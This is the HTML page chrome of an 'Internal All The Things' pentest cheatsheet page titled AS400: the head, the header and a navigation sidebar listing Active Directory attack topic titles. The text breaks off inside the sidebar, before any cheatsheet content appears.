
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Active Directory and Internal Pentest Cheatsheets">
      
      
      
        <link rel="canonical" href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/as-400/">
      
      
        <link rel="prev" href="../../active-directory/CVE/ZeroLogon/">
      
      
        <link rel="next" href="../escape-breakout/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.23">
    
    
      
        <title>AS400 - Internal All The Things</title>
      
    
    
	
      <link rel="stylesheet" href="../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
  <style>
  .social-container {
    float: right;
  }
  </style>

    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="AS400 - Internal All The Things" >
      
        <meta  property="og:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  property="og:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/cheatsheets/as-400.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/as-400/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="AS400 - Internal All The Things" >
      
        <meta  name="twitter:description"  content="Active Directory and Internal Pentest Cheatsheets" >
      
        <meta  name="twitter:image"  content="https://swisskyrepo.github.io/InternalAllTheThings/assets/images/social/cheatsheets/as-400.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#as400" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Internal All The Things" class="md-header__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Internal All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              AS400
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Internal All The Things" class="md-nav__button md-logo" aria-label="Internal All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Internal All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/InternalAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal All The Things
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../DISCLAIMER/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    DISCLAIMER
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Active directory
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Active directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-certificate-services/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc01/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc02/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc03/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC3
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc04/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC4
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc05/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC5
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc06/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC6
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc07/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC7
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc08/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC8
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc09/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC9
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc10/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC10
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc11/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC11
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc12/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC12
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc13/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC13
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc14/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC14
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-esc15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Certificate ESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adcs-golden-certificate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Golden Certificate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-acl-ace/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Access Controls ACL/ACE
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-enumerate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Enumeration
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-group-policy-objects/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Group Policy Objects
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-groups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Groups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-machineaccountquota/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Machine Account Quota
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-ntds-dumping/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - NTDS Dumping
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-recycle-bin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Recycle Bin
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adds-rodc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Read Only Domain Controller
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-adfs-federation-services/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Federation Services
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-integrated-dns/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Integrated DNS - ADIDNS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-roasting-asrep/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - ASREP Roasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-roasting-kerberoasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - Kerberoasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-roasting-timeroasting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Roasting - Timeroasting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ad-tricks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Active Directory - Tricks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/deployment-mdt/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Deployment - MDT
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/deployment-sccm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Deployment - SCCM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/deployment-wsus/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Deployment - WSUS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/hash-capture/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Capture and Cracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/hash-over-pass-the-hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - OverPass-the-Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/hash-pass-the-hash/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Pass the Hash
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/hash-pass-the-key/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Hash - Pass The Key
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-dcom/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - DCOM
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-pxe-boot-image/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - PXE Boot Image
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-relay-coerce/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - Coerce
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-relay-kerberos/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - Kerberos Relay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-relay-ntlm/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - NTLM Relay
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/internal-shares/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Internal - Shares
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-bronze-bit/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Bronze Bit
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-delegation-constrained/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-delegation-rbcd/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Resource Based Constrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-delegation-unconstrained/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos Delegation - Unconstrained Delegation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-s4u/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Service for User Extension
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/kerberos-tickets/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Kerberos - Tickets
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/pwd-comments/" class="md-nav__link">
        
  
  
